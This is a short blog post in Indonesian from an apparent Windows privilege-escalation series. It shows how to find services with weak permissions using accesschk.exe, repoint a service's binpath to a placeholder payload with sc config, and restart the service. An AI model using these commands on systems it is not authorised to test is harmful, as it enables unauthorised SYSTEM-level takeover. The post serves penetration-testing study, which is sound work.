---
layout: post
title: "Service with Bad Access Permission"
date: 2024-01-12 07:00:00 +0700
categories: "Windows-Local-Privilege-Escalation"
---

Download:
- <https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk.exe>
- <https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk64.exe>
- <https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe>

# Proof of Concept

Gunakan tool `accesschk.exe` untuk melihat service mana saja yang dapat dimodifikasi
```powershell
accesschk.exe -uwcv Everyone *
```

Mengubah BinPath untuk menginjeksi sebuah Payload
```powershell
sc config <service name> binpath= "<payload>"
```

Restart Service
```powershell
sc stop "<service name>"
sc start "<service name>"
```
